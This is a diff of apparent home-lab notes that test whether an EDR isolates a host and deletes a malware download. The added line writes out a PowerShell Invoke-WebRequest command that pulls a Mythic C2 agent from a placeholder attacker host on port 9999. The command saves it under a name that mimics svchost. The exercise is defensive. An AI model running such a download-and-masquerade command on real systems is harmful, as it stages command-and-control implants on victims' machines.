@@ -81,7 +81,7 @@
 - **Test Action:**  
     - Re-trigger the malware event and confirm that the response (e.g., isolation) is automatically executed.
     - Try to download the Mythic Agent again. SSH into the Mythic instance and mount the HTTP server again on port 9999.
-    - Go to RDP session on Windows VM and open a PowerShell console, if you move up with the arrows you should find the command of **Invoke-WebRequest** and try to download it again (command: Invoke-WebRequest ). The EDR reacts and deletes the file immediately.
+    - Go to RDP session on Windows VM and open a PowerShell console, if you move up with the arrows you should find the command of **Invoke-WebRequest** and try to download it again (command: `Invoke-WebRequest -Uri http://<MYDFIR-MYTHIC-IP>:9999/mydfir-30.exe -OutFile "C:\Users\Public\Downloads\svchost-emaan.exe"`). The EDR reacts and deletes the file immediately.
     
 ![[Pasted image 20251020005826.png]]
 
